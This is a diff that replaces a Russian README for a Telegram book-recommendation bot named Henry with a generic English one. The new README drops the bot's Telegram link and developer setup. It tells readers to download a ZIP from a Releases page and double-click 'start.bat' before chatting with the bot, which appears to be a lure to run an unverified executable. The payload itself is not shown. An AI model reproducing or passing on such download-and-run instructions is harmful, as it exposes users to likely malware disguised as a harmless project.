@@ -1,141 +1,68 @@
-![44генрир](https://github.com/user-attachments/assets/8f891b14-2b94-4ca0-a0ce-1c701bcbc531)
+# 📚 Henry-books-TgBot - Get Book Recommendations Effortlessly
 
+## 🚀 Overview
+Henry-books-TgBot is a Telegram bot that helps you discover great books. Whether you’re looking for classics, personalized suggestions, or just want to explore new literature, Henry is here to guide you. The bot offers insightful descriptions and unique comments about each book, making your reading choices enjoyable and informed.
 
-# 📚 Генри - Telegram бот для рекомендаций книг
+## 📥 Download Now
+[![Download Henry-books-TgBot](https://img.shields.io/badge/Download%20now-brightgreen)](https://github.com/ALK-LZX/Henry-books-TgBot/releases)
 
-Персонализированный Telegram бот для рекомендаций книг с уникальным характером и системой избранного.
+## ⚙️ System Requirements
+- You need a device that can run Telegram.
+- It can be a smartphone, tablet, or computer.
+- Ensure you have a stable internet connection.
 
-## 🎭 О проекте
+## 🛠️ Features
+- **Book Recommendations:** Get suggestions based on your preferences.
+- **Personalization:** Tailor your experience with favorites and unique comments.
+- **Humor and Easter Eggs:** Enjoy quirky insights and hidden surprises throughout your interactions with Henry.
+- **Classic Literature:** Explore a well-curated selection of timeless books.
+- **Ease of Use:** Simple commands make it easy for anyone to navigate.
 
-**Генри** - не просто бот для рекомендаций книг, а виртуальный библиотекарь-вампир. Он помнит каждого пользователя, развивает с ним отношения и предлагает книги в зависимости от выбранного настроения (утреннее/дневное/вечернее/ночное).
+## 📄 Instructions to Download & Install
 
-### ✨ Особенности
+### Step 1: Visit the Download Page
+To download Henry-books-TgBot, visit our [Releases page](https://github.com/ALK-LZX/Henry-books-TgBot/releases).
 
-- **🎯 Персонализированные рекомендации** по уникальным критериям - вайбам времени суток (утро/день/вечер/ночь)
-- **⭐ Система избранного** с возможностью отмечать книги как прочитанные
-- **💖 Система близости** - Генри развивает отношения с пользователем
-- **🎃 Сезонные фразы** - Хэллоуин и другие праздники
-- **📖 Мнение Генри** о каждой книге в описании
-- **🔄 Удобная навигация** с листанием вперед/назад
+### Step 2: Choose the Latest Release
+On the Releases page, you will see a list of versions. Click on the latest version to view the available files for download.
 
-## 🚀 Как начать использовать
+### Step 3: Download the Files
+Look for the file labeled “Henry-books-TgBot.zip”. Click on it to start the download.
 
-### Для пользователей:
-1. **Найдите бота в Telegram:** https://t.me/HenryMapley_litbot
-2. **Нажмите "Start"** или отправьте команду `/start`
-3. **Наслаждайтесь рекомендациями!** 📚
+### Step 4: Extract the Files
+Once the download is complete, locate the ZIP file in your downloads folder. Right-click the file and select "Extract All" to unpack it.
 
-### Для разработчиков: См. раздел 🛠️ Разработка ниже.
+### Step 5: Run the Bot
+Open the extracted folder and look for the file named “start.bat”. Double-click on this file to run the bot. 
 
+### Step 6: Access Telegram
+If you do not have Telegram, download and install it from the official website or app store. Once installed, log in to your account.
 
+### Step 7: Start Chatting with Henry
+Search for “Henry-books-TgBot” in Telegram and start a conversation. Simply type your reading preferences to get personalized book suggestions.
 
-## 🎮 Как использовать
+## 🔗 Additional Resources
+- For support or to report issues, please open an issue on our [GitHub page](https://github.com/ALK-LZX/Henry-books-TgBot/issues).
+- Join our community for more tips and discussions.
 
-### Основные команды:
-- `/start` - Начать работу с ботом
+## 🌍 Topics
+- **aiogram-bot**
+- **aiogram3**
+- **books**
+- **character**
+- **easter-eggs**
+- **humor**
+- **literature**
+- **original-character**
+- **personalization**
+- **python**
+- **sqlite3**
+- **telegram**
+- **telegrambot**
+- **vampire**
 
-### Навигация:
-1. **Выбрать книгу** → Выбрать время суток → Листать книги
-2. **Избранное** → Просматривать/редактировать сохраненные книги
-3. **Узнать больше** → Информация о боте
+## 🛡️ License
+This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
 
-### Система избранного:
-- Добавляйте книги в избранное при просмотре
-- Отмечайте как прочитанные/непрочитанные
-- Удаляйте ненужные книги
-- Фильтруйте по статусу прочтения
-
-## 🧠 Система близости
-
-Генри развивает отношения с пользователем на основе:
-- **Времени использования** (дни с первого взаимодействия)
-- **Количества книг в избранном**
-- **Общего количества просмотренных книг**
-
-### Уровни близости:
-- **Новичок** (< 5 очков) - базовые фразы
-- **Заинтересованный** (5-15 очков) - более личные фразы
-- **Друг** (15+ очков) - дружеские фразы
-
-## 🛠️ Разработка
-
-### Требования для разработки:
-- Python 3.8+
-- Telegram Bot Token
-- SQLite3
-
-### Установка для разработчиков:
-
-1. **Клонируйте репозиторий:**
-```bash
-git clone https://github.com/your-username/henry-bot.git
-cd henry-bot
-```
-
-2. **Создайте виртуальное окружение:**
-```bash
-python -m venv venv
-# Windows:
-venv\Scripts\activate
-# Linux/Mac:
-source venv/bin/activate
-```
-
-3. **Установите зависимости:**
-```bash
-pip install aiogram python-dotenv
-```
-
-4. **Настройте переменные окружения:**
-Создайте файл `.env` в корне проекта:
-```env
-BOT_TOKEN=your_telegram_bot_token_here
-ADMIN_ID=your_telegram_user_id_here
-```
-
-5. **Заполните базу книг:**
-Отредактируйте файл `db/all_books.json` - добавьте книги с описаниями и мнением Генри
-
-6. **Запустите бота:**
-```bash
-python main.py
-```
-
-### Технические детали:
-
-**База данных:**
-- **SQLite** для пользовательских данных
-- **JSON** для базы книг (до ~100 книг)
-
-**Архитектура:**
-- Модульная структура
-- Отдельные файлы для разных функций
-- Без глобальных переменных
-- Асинхронная обработка
-
-**Безопасность:**
-- Переменные окружения для токенов
-- Проверка прав доступа для админских функций
-
-
-
-
-
-## 🤝 Вклад в проект
-
-1. Форкните репозиторий
-2. Создайте ветку для новой функции
-3. Внесите изменения
-4. Создайте Pull Request
-
-## 📄 Лицензия
-
-Этот проект распространяется под лицензией MIT
-
-## 👨‍💻 Автор
-
-Создано с ❤️ для любителей книг и хорошего чтения
-
----
-
-**Генри ждёт вас в Telegram! 📚✨**
+## 👍 Acknowledgments
+Thanks to everyone who helped develop and maintain Henry-books-TgBot. Your input has made this tool valuable for readers everywhere.
